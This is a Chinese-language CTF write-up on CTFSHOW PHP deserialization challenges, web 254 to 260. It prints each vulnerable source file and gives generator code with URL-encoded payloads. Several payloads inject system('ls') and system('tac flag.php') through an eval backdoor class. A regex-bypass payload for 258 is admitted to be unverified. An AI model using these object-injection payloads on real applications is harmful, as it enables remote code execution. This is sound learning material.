---
description: 做题记录来了，蓝桥杯快开始了，我还是什么都不会，太酷啦
---

# 💾 CTFSHOW 反序列化

## <mark style="color:blue;background-color:purple;">（1）WEB 254</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}

```

其实这个就是一个对代码理解的题目

### ①代码解释

其实就是接受了username和password，如果两个都存在的话，实例化一个对象user，然后再引用function  login，要让login存在，并且checkvip函数也存在的话，就会引用viponekeygetflag函数。如果login函数要用的话，需要用$username完全等于$u,$password完全等于$p.

### ②思路解释

根据上面的分析，所以我们我们直接传入$username和$password两个结果就可以了。

```url
http://dd78310d-6f85-49a1-a642-ac58a05a72d9.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## <mark style="color:blue;background-color:purple;">（2）WEB 255</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}



```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ①代码解释

以GET方式传入两个参数username和password，然后对user这个cookie进行反序列化，并且里面username和password需要让他们等于u和p，并且要求isVip等于1，就可以得到flag了。

### ②思路解释

我们知道了三个要求，$username等于$u,$password等于$p,$isVip等于true。

并且需要传入cookie的user和get两个参数。而且user需要时序列化后的结果。

我们首先需要对user进行序列化。我们可以用一个php代码来得到。

```php

<?php

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;
}
$a=new ctfShowUser();
echo serialize($a);

?>

```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

得到的结果为

```
O:11:"ctfShowUser":3:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;}
```

然后我们就可以把他转码之后放到cookie里面了。

```
O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

{% hint style="info" %}
cookie的内容需要url编码
{% endhint %}

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后我们的GET里面的参数还是

```
http://e3d28ae1-883e-408a-a621-5799c1ada8fd.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
```

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

得到flag

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## <mark style="color:blue;background-color:purple;">（3）WEB 256</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}


```

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ①代码解释

和上面的差别就是username和password不一样就可以了。

### ②思路解释

我们首先写一个php代码来生成cookie

```php

<?php

class ctfShowUser{
    public $username='123';
    public $password='456';
    public $isVip=true;
}
$a=new ctfShowUser();
echo urlencode(serialize($a));

?>

```

得到的结果是

```
O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22456%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

传入GET的结果是

```url
http://65180760-7f41-4368-9d05-130363fbfb54.challenge.ctf.show/?username=123&password=456
```

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;background-color:purple;">(4)WEB 257</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}





```

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### ①代码解释

这个代码比较复杂了家人们，首先还是GET方式得到两个参数$username $password,然后反序列化cookie里面的user，再创建这个之前，我们需要执行\_\_construct()，然后再讲login传入username和password，然后然后再执行\_\_destruct(),然后再执行getInfo（），这个时候就要看class是等于什么了。

### ②思路解释

如果我们想要他执行backDoor里面的getinfo，我们就要让class等于backDoor，然后我们就有机会控制eval（）函数执行的代码片段。

所以这个时候我们可以用php代码来生成我们需要的user。

除了基本的，我们就是让class等于backDoor，让code等于我们要执行的代码差不多是system("ls");

```php
<?php

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'backDoor';

    public function __construct(){
        $this->class=new backDoor();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code='system("ls");';
    public function getInfo(){
        eval($this->code);
    }
}

$a=new ctfShowUser();
echo urlencode(serialize($a));

```

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

```
O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A13%3A%22system%28%22ls%22%29%3B%22%3B%7D%7D
```

然后我们将这个写入到cookie里面，

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后我们再写入GET参数

```url
http://4e682701-7827-469b-b19a-e1fa65731ba8.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这里我们首先写入的是ls命令，我们看到flag.php文件，所以我们查看flag.php

我们将他修改为

```
O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

最后得到flag。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;background-color:purple;">（5）web 258</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 21:38:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}

```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ①代码解释

就是加了正则表达式，其他都差异。我们这里就直接解释这个正则表达式了。这个正则表达式匹配的就是字母:数字，这种，举个例子就是O:124,C:123,o:123,c:123.

### ②思路解释

这个我的确是不知道，但是看了别人的wp，大概是，就是在数字前面加一个+，是表示正数吗，我不太清楚，记住就行了吧。

所以其实得到的是

```
O:11:"ctfShowUser":4:{s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:0;s:18:"ctfShowUserclass";O:8:"backDoor":1:{s:14:"backDoorcode";s:23:"system("tac flag.php");";}}
```

所以最后是

```
O:+11:"ctfShowUser":4:{s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:0;s:18:"ctfShowUserclass";O:8:"backDoor":1:{s:14:"backDoorcode";s:23:"system("tac flag.php");";}}
```

url encode之后就是

```
O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22ctfShowUserusername%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22ctfShowUserpassword%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22ctfShowUserisVip%22%3Bb%3A0%3Bs%3A18%3A%22ctfShowUserclass%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22backDoorcode%22%3Bs%3A23%3A%22system(%22tac%20flag.php%22)%3B%22%3B%7D%7D
```

不知道为什么我这个出不来，我不想死在这，但是这个方法是这样没有错误的的，如果有那也不是我的问题了。



## <mark style="color:blue;background-color:purple;">（6）WEB 260</mark>

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}

```

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ①代码解释

只要匹配有ctfshow......就行了。

### ②思路解释

那我们就直接写一个数组里面包含ctfshow......就行了。

```
http://7b449c38-ff6e-4537-8613-49e9378f741e.challenge.ctf.show/?ctfshow[]='ctfshow_i_love_36D'
```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

（7）

























